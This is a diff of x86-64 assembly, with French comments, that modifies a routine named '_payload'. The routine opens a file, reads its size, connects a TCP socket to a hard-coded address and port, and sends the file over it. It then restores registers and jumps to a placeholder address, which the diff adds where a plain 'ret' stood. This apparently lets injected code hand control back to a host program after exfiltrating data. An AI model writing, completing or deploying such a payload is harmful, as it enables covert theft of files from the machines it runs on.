@@ -27,7 +27,6 @@ _payload:
     lea rdi, [rel path]		; Chemin du fichier
     mov rsi, 0				; O_RDONLY
     syscall
-	mov r14, rax
     test rax, rax
     js exit					; Gestion de l'erreur
 
@@ -38,7 +37,6 @@ _payload:
     lea rdi, [rel path]			; Chemin du fichier
     lea rsi, [rel stat_buffer]	; Pointeur vers la structure stat
     syscall
-	mov r14, rax
     test rax, rax
     js error_open			; Gestion de l'erreur
 
@@ -48,7 +46,6 @@ _payload:
     mov rsi, 1				; SOCK_STREAM
     mov rdx, 0
     syscall
-	mov r14, rax
     test rax, rax
     js error_open			; Gestion de l'erreur
 
@@ -61,7 +58,6 @@ _payload:
     lea rsi, [rel sockaddr_in]	; Pointeur vers sockaddr_in
     mov rdx, 16					; Taille de sockaddr_in
     syscall
-	mov r14, rax
     test rax, rax
     js error_socket				; Gestion de l'erreur
 
@@ -72,7 +68,6 @@ _payload:
 	xor rdx, rdx					; offset (NULL)
 	mov r10, [rel stat_buffer + 48]	; size
 	syscall
-	mov r14, rax
     test rax, rax
     js error_socket					; Gestion de l'erreur
 
@@ -95,9 +90,7 @@ exit:
 	xor rax, rax
 	popx rax, rdi, rsi, rsp, rdx, rcx, r8, r9, r12
 	popfq
-	mov rax, r14
-	; jmp 0x0
-	ret
+	jmp 0x0
 
 stat_buffer	times 144 db 0	; Taille de struct stat sur x86-64
 sockaddr_in:
@@ -106,8 +99,8 @@ sockaddr_in:
 	; - sin_addr: 4 octets
 	; - sin_zero: 8 octets
 	dw 2                       ; sin_family (AF_INET)
-	dw 0x9210                  ; sin_port (3002 en hex)
-	dd 0x0              ; sin_addr (INADDR_ANY)
+	dw 0xba0b                  ; sin_port (3002 en hex)
+	dd 0                       ; sin_addr (INADDR_ANY)
 	times 8 db 0               ; sin_zero (8 octets de zéros)
 	; Taille totale: 16 octets
 ; path		times 1024 db 0	; Chemin du fichier
